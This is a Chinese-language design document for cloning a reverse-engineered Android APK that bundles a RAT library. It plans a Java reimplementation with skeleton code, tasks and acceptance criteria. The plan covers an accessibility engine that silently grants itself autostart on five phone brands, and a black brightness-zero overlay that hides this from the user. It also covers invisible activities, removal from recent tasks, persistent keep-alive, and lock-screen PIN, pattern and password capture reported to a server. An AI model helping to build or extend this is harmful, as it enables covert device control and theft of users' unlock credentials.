# Vendor APK 一比一复刻 — 需求与设计文档

> **版本**: 2.0
> **日期**: 2026-03-16
> **基于**: 16 份逆向分析文档 + 4655 个反编译 Java 文件
> **目标**: 将 `decompiled_vendor` APK 的核心功能移植到新的 Java 项目

---

## 一、项目概述

### 1.1 Vendor APK 核心特性

| 维度 | 实现方式 | 复刻价值 |
|------|---------|---------|
| 架构 | Java + Go Native (librat-hat.so + libfrpc.so) | 仅复刻 Java 层 |
| 通信 | HTTP + WebSocket + FRP 三层 | 可简化为 WebSocket |
| 自动化框架 | UiObject/CombineFilter 动态框架 | ⭐ 极高 |
| 厂商适配 | 28 个厂商（o/ 包 33 个类） | ⭐ 极高（先做 5 大厂商） |
| 隐蔽技术 | NoDisplayActivity + BlockView + PiP + 1x1窗口 | ⭐ 高 |
| 保活机制 | 多进程守护 + 息屏唤醒 + 厂商白名单 | ⭐ 高 |
| 密码窃取 | PIN/图案/密码 透明覆盖层监听 | 中 |
| 配置加密 | AES-128-ECB | 低（可用现代加密） |

### 1.2 复刻策略

**新项目定位**：纯 Java Android 项目，专注核心自动化能力

**不复刻部分**：
- ❌ Native 层（librat-hat.so / libfrpc.so）：Go 逆向成本极高（6-8 人月）
- ❌ FRP 通信层：可独立部署，不嵌入 APK
- ❌ 28 个厂商全部适配：先做 5 大厂商（覆盖 90% 市场）

**复刻重点**：
- ✅ UI 自动化框架（UiObject/CombineFilter/Condition）
- ✅ 厂商适配引擎（华为/小米/OPPO/vivo/三星）
- ✅ 隐蔽技术（NoDisplayActivity/BlockView/PiP）
- ✅ 保活机制（多进程守护/息屏唤醒/厂商白名单）

**技术优势**：
- 纯 Java 开发，无 smali 限制
- 可使用现代 Android 库（Kotlin Coroutines、Jetpack 等）
- 易于测试和维护
- 可快速迭代

---

## 二、功能模块清单

### 2.1 模块优先级矩阵

| 优先级 | 模块 | Vendor 源文件 | 代码量 | 复刻价值 |
|--------|------|------------|--------|---------|
| P0 | UI 自动化框架 | entity/UiObject + filter/* + condition/* | ~800 行 | 极高 |
| P0 | 无障碍服务核心 | service/MyAccessibilityService | ~600 行 | 极高 |
| P0 | 自动化引擎基类 | o/c.java + o/e.java | ~400 行 | 极高 |
| P1 | 华为/荣耀适配 | o/n.java | 454 行 | 高 |
| P1 | 小米/红米适配 | o/q.java | 498 行 | 高 |
| P1 | OPPO/realme 适配 | o/v.java | 526 行 | 高 |
| P1 | vivo/iQOO 适配 | o/u.java | ~400 行 | 高 |
| P1 | 三星适配 | o/s.java | ~300 行 | 中 |
| P1 | 遮罩系统 | helper/g.java | ~200 行 | 高 |
| P2 | 锁屏密码监听 | o/h.java + helper/r.java | ~500 行 | 高 |
| P2 | 透明覆盖层 | helper/o.java + helper/n.java | ~300 行 | 高 |
| P2 | 保活机制 | helper/g.java + receiver/* | ~400 行 | 高 |
| P2 | NoDisplayActivity | activity/NoDisplayActivity | ~100 行 | 中 |
| P2 | PiP + 痕迹清理 | e/b.java | ~150 行 | 中 |
| P3 | 配置加密系统 | utils/d.java + a1/q.java | ~200 行 | 低 |
| P3 | HTTP 客户端 | http/* (34 文件) | ~2000 行 | 低（可用 OkHttp） |
| P3 | WebSocket 桥接 | bridge/a.java | ~300 行 | 低（可用现成库） |

---

## 三、P0 模块详细设计

### 3.1 UI 自动化框架

**Vendor 实现**：完整的 UI 节点查询框架

```
entity/UiObject.java          — UI 节点封装（click/scroll/findBy/checked 等）
entity/UiObjectCollection.java — 节点集合（findByCombine/scrollForwardUtil 等）
filter/CombineFilter.java      — 组合过滤器（className + text + id + clickable）
condition/StringCondition.java  — 字符串条件（equals/contains/prefix/regex）
condition/BoolCondition.java    — 布尔条件（clickable/checked/enabled）
condition/PointCondition.java   — 坐标条件（x/y/tolerance）
```

**复刻设计**：直接用 Java 实现

```java
// 包结构
com.vendor.auto.entity
  ├── UiNode.java              // 封装 AccessibilityNodeInfo
  └── UiNodeCollection.java    // 节点集合

com.vendor.auto.filter
  ├── NodeFilter.java          // 过滤器接口
  ├── CombineFilter.java       // 组合过滤器
  └── FilterBuilder.java       // 流式构建器

com.vendor.auto.condition
  ├── StringCondition.java     // 字符串匹配
  ├── BoolCondition.java       // 布尔条件
  └── PointCondition.java      // 坐标条件

com.vendor.auto.action
  └── UiAction.java            // 操作执行器
```

**核心 API**：
```java
// 查找节点
UiNode.findByText(root, "设置")
UiNode.findById(root, "com.android.settings:id/title")
UiNode.findByClass(root, "android.widget.Switch")
UiNode.findByCombine(root, filter)

// 滚动查找
UiNode.scrollForwardUntil(scrollable, predicate)
UiNode.scrollBackwardUntil(scrollable, predicate)

// 操作
node.click()
node.longClick()
node.setText("text")
node.scrollForward()
```

### 3.2 自动化引擎基类

**Vendor 实现**：`o/c.java` (基类) + `o/e.java` (接口)

```java
// o/e.java — 自动化引擎接口
interface AutomationEngine {
    void onEvent(AccessibilityEvent event, String pkg, String cls);
    void destroy();
}

// o/c.java — 基类
abstract class BaseEngine implements AutomationEngine {
    LinkedList<ListenWindow> listenWindows;
    ConcurrentLinkedQueue<Task> taskQueue;
    ScheduledExecutorService scheduler;
    ReentrantLock lock;

    boolean matchWindow(List<ListenWindow> windows);
    boolean isCompleted();
    void pressHome();
    void finish();
    UiNode getScrollView();
    void refreshRoot();
}
```

**复刻设计**：

```java
// com.vendor.auto.engine.AutoEngine.java
public abstract class AutoEngine {
    protected String targetPackage;
    protected List<WindowMatcher> windowMatchers;
    protected ScheduledExecutorService timeoutTimer;
    protected AtomicBoolean completed = new AtomicBoolean(false);
    protected AtomicBoolean running = new AtomicBoolean(false);
    protected AccessibilityService service;

    // 子类实现
    protected abstract void onWindowMatched(String pkg, String cls);
    protected abstract void execute();

    // 基类方法
    public boolean matchWindow(String pkg, String cls) {
        for (WindowMatcher matcher : windowMatchers) {
            if (matcher.match(pkg, cls)) return true;
        }
        return false;
    }

    public void start(long timeoutSeconds) {
        running.set(true);
        timeoutTimer.schedule(this::timeout, timeoutSeconds, TimeUnit.SECONDS);
        execute();
    }

    public void finish() {
        completed.set(true);
        running.set(false);
        timeoutTimer.shutdown();
    }

    protected void pressHome() {
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
    }

    protected void pressBack() {
        service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
    }
}
```

### 3.3 无障碍服务事件分发

**Vendor 实现**：`MyAccessibilityService.G(event)` → 分发到注册的引擎

```java
// AccessibilityDelegateManager.java
class AccessibilityDelegateManager {
    ConcurrentHashMap<String, AutomationEngine> delegates;

    void register(String id, AutomationEngine engine);
    void unregister(String id);
    void dispatch(AccessibilityEvent event);
}
```

**复刻设计**：

```java
// com.vendor.auto.service.VendorAccessibilityService.java
public class VendorAccessibilityService extends AccessibilityService {
    private final EngineManager engineManager = new EngineManager();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = event.getPackageName().toString();
        String className = event.getClassName().toString();

        // 分发到所有注册的引擎
        engineManager.dispatch(packageName, className, event);
    }

    public void registerEngine(String id, AutoEngine engine) {
        engineManager.register(id, engine);
    }

    public void unregisterEngine(String id) {
        engineManager.unregister(id);
    }
}
```

---

## 四、P1 模块详细设计

### 4.1 厂商适配引擎

每个厂商一个引擎类，继承 AutoEngine：

| 厂商 | Vendor 类 | 新建类 | 监听窗口 | 核心操作 |
|------|----------|--------|---------|---------|
| 华为/荣耀 | o/n.java (454行) | HuaweiEngine.java | com.huawei.systemmanager / com.hihonor.systemmanager | 启动管理→手动管理→全部允许 |
| 小米/红米 | o/q.java (498行) | XiaomiEngine.java | com.miui.securitycenter | 自启动管理→允许 |
| OPPO/realme | o/v.java (526行) | OppoEngine.java | com.coloros.safecenter | 自启动管理→允许 |
| vivo/iQOO | o/u.java (~400行) | VivoEngine.java | com.vivo.permissionmanager | 自启动→允许 |
| 三星 | o/s.java | SamsungEngine.java | com.samsung.android.lool | 电池优化→不优化 |

**华为引擎详细流程**（参考 o/n.java）：

```
1. 打开启动管理 (intent action: huawei.intent.action.HSM_STARTUPAPP_MANAGER)
2. 等待窗口: StartupAppControlActivity
3. 滚动查找应用名
4. 点击应用 → 关闭"自动管理"勾选框
5. 等待 AlertDialog → 点击确认
6. 设置 3 个开关: 自启动/关联启动/后台活动
7. 保存状态 → 返回
```

**小米引擎详细流程**（参考 o/q.java）：

```
1. 打开自启动管理 (com.miui.securitycenter/.permission.autostart.AutoStartManagementActivity)
2. 滚动查找应用名
3. 点击开关 → 允许自启动
4. 打开电池优化 → 无限制
5. 打开后台运行 → 允许
```

### 4.2 遮罩系统升级

**Vendor 实现**：`helper/g.java`

```java
// 核心功能
g.b(BlockViewVO)  — 创建遮罩（全屏黑色 + 亮度归零）
g.c()             — 移除遮罩（恢复亮度 + HOME键）
g.h(int progress) — 更新进度（0-100）
g.d()             — 延迟移除
```

**复刻设计**：

```java
// com.vendor.auto.ui.BlockViewManager.java
public class BlockViewManager {
    private WindowManager windowManager;
    private View blockView;
    private int originalBrightness;

    // 创建全屏遮罩
    public void show(BlockViewConfig config) {
        // 1. 保存当前亮度
        // 2. 创建全屏黑色 View
        // 3. 设置亮度为 0
        // 4. 显示进度（可选）
    }

    // 移除遮罩
    public void hide() {
        // 1. 移除 View
        // 2. 恢复亮度
        // 3. 按 HOME 键（可选）
    }

    // 更新进度
    public void updateProgress(int progress) {
        // 更新进度条显示（0-100）
    }
}
```

### 4.3 设备品牌检测

**Vendor 实现**：`utils/e.java`

```java
e.e()   — 获取屏幕尺寸
e.i()   — 是否三星
e.l()   — 是否 vivo
e.n()   — 是否 OPPO
e.p()   — 是否小米
e.r()   — 是否华为
e.t()   — 是否荣耀
```

**复刻设计**：

```java
// com.vendor.auto.utils.DeviceUtils.java
public class DeviceUtils {
    public static boolean isHuawei() {
        return Build.MANUFACTURER.equalsIgnoreCase("HUAWEI");
    }

    public static boolean isHonor() {
        return Build.MANUFACTURER.equalsIgnoreCase("HONOR");
    }

    public static boolean isXiaomi() {
        String brand = Build.BRAND.toLowerCase();
        return brand.contains("xiaomi") || brand.contains("redmi");
    }

    public static boolean isOppo() {
        String brand = Build.BRAND.toLowerCase();
        return brand.contains("oppo") || brand.contains("realme");
    }

    public static boolean isVivo() {
        String brand = Build.BRAND.toLowerCase();
        return brand.contains("vivo") || brand.contains("iqoo");
    }

    public static boolean isSamsung() {
        return Build.MANUFACTURER.equalsIgnoreCase("samsung");
    }

    public static int getVendorId() {
        if (isHuawei()) return 1;
        if (isXiaomi()) return 2;
        if (isVivo()) return 3;
        if (isOppo()) return 4;
        if (isSamsung()) return 6;
        if (isHonor()) return 14;
        return 0;
    }
}
```

---

## 五、P2 模块详细设计

### 5.1 锁屏密码监听

**Vendor 实现**：`o/h.java` + `helper/r.java` + `helper/o.java`

```
触发: 检测到锁屏界面 (com.android.systemui)
  → 创建透明触摸监听层 (TYPE_ACCESSIBILITY_OVERLAY)
  → 监听 PIN 输入 (EditText text 变化)
  → 监听图案绘制 (GESTURE_POINTS)
  → 上报到服务器
```

支持的锁屏类型：
- PIN 码（数字键盘）
- 图案锁（手势轨迹）
- 密码（文本输入）
- 厂商特殊界面（vivo/OPPO/三星）

### 5.2 保活机制

**Vendor 实现**：多层保活

```
1. 前台服务 (Notification)
2. WorkManager 定时任务
3. AlarmManager 定时唤醒
4. 息屏监听 → 唤醒服务
5. 厂商白名单（启动管理自动化）
6. 双进程守护（主进程 + com.google.guard）
7. JobScheduler 兜底
```

**我们已有**：
- 前台服务 (EngineWorker/WorkServices/LiveChat)
- BootReceiver 开机自启
- 华为启动管理自动化（刚实现）

**需要补充**：
- 息屏监听 + 唤醒
- AlarmManager 定时任务
- 其他厂商白名单自动化

### 5.3 NoDisplayActivity

**Vendor 实现**：完全不可见的 Activity 跳板

```java
setTheme(R.style.Theme.NoDisplay);
onResume() → finish();  // 立即关闭
```

用途：后台触发操作、启动服务、初始化组件。

### 5.4 PiP + 痕迹清理

**Vendor 实现**：`e/b.java`

```java
enterPictureInPictureMode(params);  // 50:20 极小窗口
finishAndRemoveTask();              // 从最近任务中移除
```

---

## 六、实施路线图

### Phase 1: 基础框架（1-2 周）

| 任务 | 文件 | 工作量 |
|------|------|--------|
| 实现 UiNode/UiNodeFinder/UiAction | 新建 3 个 Java 类 | 2 天 |
| 实现 AutoEngine 基类 | 新建 1 个 Java 类 | 1 天 |
| 实现 WindowMatcher | 新建 1 个 Java 类 | 0.5 天 |
| 实现 VendorAccessibilityService | 新建 1 个 Java 类 | 1 天 |
| 单元测试 | JUnit + Robolectric | 1.5 天 |

### Phase 2: 厂商适配（2-3 周）

| 任务 | 文件 | 工作量 |
|------|------|--------|
| 华为引擎（基于 AutoEngine） | HuaweiEngine.java | 2 天 |
| 小米引擎 | XiaomiEngine.java | 2.5 天 |
| OPPO 引擎 | OppoEngine.java | 2.5 天 |
| vivo 引擎 | VivoEngine.java | 2 天 |
| 三星引擎 | SamsungEngine.java | 1.5 天 |
| 多设备测试 | 5 台真机测试 | 3 天 |

### Phase 3: 隐蔽技术（1-2 周）

| 任务 | 文件 | 工作量 |
|------|------|--------|
| 通用遮罩系统 | BlockViewManager.java | 1.5 天 |
| NoDisplayActivity | NoDisplayActivity.java | 0.5 天 |
| PiP + 痕迹清理 | PipHelper.java | 1 天 |
| 锁屏密码监听框架 | 新建 3 个 Java 类 | 3 天 |
| 透明覆盖层 | 新建 2 个 Java 类 | 2 天 |

### Phase 4: 保活增强（1 周）

| 任务 | 文件 | 工作量 |
|------|------|--------|
| 息屏监听 + 唤醒 | ScreenReceiver.java | 1 天 |
| AlarmManager 定时 | AlarmHelper.java | 0.5 天 |
| 双进程守护 | GuardService.java | 2 天 |

---

## 七、技术选型与约束

### 7.1 项目架构

**项目类型**：纯 Java Android 项目

**构建工具**：Gradle 8.x + Android Gradle Plugin 8.x

**最低 SDK**：API 21 (Android 5.0)

**目标 SDK**：API 34 (Android 14)

### 7.2 核心依赖

```gradle
dependencies {
    // Android 核心
    implementation 'androidx.appcompat:appcompat:1.6.1'

    // 网络通信（可选）
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'com.squareup.okhttp3:okhttp-ws:4.12.0'

    // JSON 解析
    implementation 'com.google.code.gson:gson:2.10.1'

    // 加密
    implementation 'androidx.security:security-crypto:1.1.0-alpha06'

    // 测试
    testImplementation 'junit:junit:4.13.2'
    testImplementation 'org.robolectric:robolectric:4.11.1'
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
}
```

### 7.3 开发流程

1. **标准 Java 开发**：使用 Android Studio 直接编写 Java 代码
2. **单元测试**：使用 JUnit + Robolectric 进行单元测试
3. **真机测试**：使用 5 台不同厂商设备进行集成测试
4. **混淆配置**：使用 ProGuard/R8 进行代码混淆
5. **签名打包**：标准 APK 签名流程

### 7.4 不复刻的部分

| 模块 | 原因 |
|------|------|
| librat-hat.so (Go RAT) | 逆向成本极高（6-8 人月），用 WebSocket 替代 |
| libfrpc.so (FRP) | 可独立部署，不嵌入 APK |
| 28 个厂商全部适配 | 先做 5 大厂商（覆盖 90% 市场） |
| 服务端下发自动化脚本 | 过度工程化，硬编码足够 |
| HTTP 客户端（34 文件） | 用 OkHttp 替代 |
| 自定义 WebSocket | 用 OkHttp WebSocket 替代 |

---

## 八、验收标准

### 8.1 功能验收

| 功能 | 验收标准 |
|------|---------|
| UI 自动化框架 | 能通过 byText/byId/byClass 查找节点并执行 click/scroll |
| 华为适配 | 华为 Mate 10 / P30 / Mate 40 三台设备通过 |
| 小米适配 | 小米 12 / Redmi Note 12 两台设备通过 |
| OPPO 适配 | OPPO Reno 系列一台设备通过 |
| vivo 适配 | vivo X 系列一台设备通过 |
| 遮罩系统 | 用户无感知，操作完成后自动恢复 |
| 保活 | 息屏 30 分钟后服务仍在运行 |

### 8.2 性能验收

| 指标 | 目标 |
|------|------|
| 自动化完成时间 | < 10 秒 |
| 内存占用增量 | < 5 MB |
| 电池消耗增量 | < 2%/小时 |
| APK 体积增量 | < 200 KB |
